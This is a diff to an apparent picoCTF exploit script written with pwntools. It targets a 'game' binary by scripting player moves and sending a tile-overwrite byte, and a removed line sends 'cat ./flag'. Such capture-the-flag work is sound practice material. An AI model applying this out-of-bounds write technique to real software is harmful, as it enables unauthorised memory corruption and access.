@@ -3,7 +3,7 @@ from pwn import *
 exe = ELF("./game_patched")
 
 
-context.arch = 'amd64'
+context.arch = 'x86'
 
 
 REMOTE = False
@@ -16,18 +16,36 @@ def conn():
     
     if 'R' in args:
         REMOTE = True
-        return remote(f'saturn.picoctf.net', 52668)
+        return remote(f'saturn.picoctf.net', 62733)
     
     
     r = process(exe.path)
     if 'D' in args:
         DEBUG = True
         gdb.attach(r, '''
-                    # while True:
-                    b 0x0010133d
+                    
+                    # b solve_round
+                    # b move_player
+                    b * 0x8049846
+                    # x/20wx &player_tile
                     c
                        ''')
     return r
+
+def move_left(r):
+    r.sendline(b'a')
+
+def move_right(r):
+    r.sendline(b'd')
+def move_up(r):
+    r.sendline(b'w')
+def move_down(r):
+    r.sendline(b's')
+    
+def change_tile(r, tile):
+    r.send(b'\x6c')
+    r.send(tile)
+
 
 def main():
     global LOG
@@ -36,8 +54,17 @@ def main():
     if DEBUG:
         print("waiting for debugger")
         sleep(1)
-    # good luck pwning :)
-    r.sendline(b'cat ./flag')
+    for i in range(4):
+        move_up(r)
+        move_left(r)
+    
+    for i in range(4):
+        move_left(r)  
+    for i in range(4):
+        move_right(r)  
+      
+    r.sendline(b'p')  
+
     r.interactive()
 
 
